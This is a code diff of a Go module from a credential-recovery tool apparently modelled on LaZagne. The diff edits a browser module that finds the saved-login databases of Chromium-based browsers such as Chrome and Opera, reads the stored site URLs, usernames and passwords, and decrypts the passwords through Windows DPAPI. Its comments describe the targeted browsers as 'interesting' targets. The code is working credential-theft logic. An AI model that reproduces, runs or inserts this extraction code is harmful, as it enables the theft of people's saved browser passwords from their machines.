@@ -1,15 +1,15 @@
 package browsers
 
 import (
-"database/sql"
-"fmt"
-"github.com/buger/jsonparser"
-"github.com/kerbyj/goLazagne/common"
-"io/ioutil"
-"os"
+	"database/sql"
+	"fmt"
+	"github.com/buger/jsonparser"
+	"github.com/kerbyj/goLazagne/common"
+	"io/ioutil"
+	"os"
 )
 
-func ChromeModuleStart(path string) ([]common.UrlNamePass, bool) {
+func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 	if _, err := os.Stat(path + "\\Local State"); err == nil {
 		fileWithUserData, err := ioutil.ReadFile(path + "\\Local state")
 		if err != nil {
@@ -52,7 +52,11 @@ func ChromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 			var data []common.UrlNamePass
 			for rows.Next() {
 				rows.Scan(&actionUrl, &username, &password)
-				//data = append(data, fmt.Sprintf("%s %s %s", actionUrl, username, common.Win32CryptUnprotectData(password, false)))
+
+				/*
+					Chromium browser use default win cryptapi function named "CryptProtectData" for encrypting saved credentials.
+					Read about DPAPI for more information.
+				*/
 				data = append(data, common.UrlNamePass{actionUrl, username, common.Win32CryptUnprotectData(password, false)})
 			}
 
@@ -65,6 +69,9 @@ func ChromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 }
 
 var (
+	/*
+		Paths for more interesting and popular browsers for us
+	*/
 	chromePathsUserData = []string{
 		common.LocalAppData + "\\Google\\Chrome\\User Data",        // Google chrome
 		common.AppData + "\\Opera Software\\Opera Stable",          // Opera
@@ -77,6 +84,9 @@ var (
 	}
 )
 
+/*
+	Function used to extract credentials from chromium-based browsers (Google Chrome, Opera, Yandex, Vivaldi, Cent Browser, Amigo, Chromium, Sputnik).
+*/
 func ChromeExtractDataRun() common.ExtractCredentialsResult {
 	var Result common.ExtractCredentialsResult
 	var EmptyResult = common.ExtractCredentialsResult{false, Result.Data}
@@ -86,9 +96,8 @@ func ChromeExtractDataRun() common.ExtractCredentialsResult {
 	for i := range chromePathsUserData {
 		if _, err := os.Stat(chromePathsUserData[i]); err == nil {
 
-			var data, success = ChromeModuleStart(chromePathsUserData[i])
+			var data, success = chromeModuleStart(chromePathsUserData[i])
 			if success && data != nil {
-				//Result.Data = append(Result.Data, data...)
 				allCreds = append(allCreds, data...)
 			}
 		}
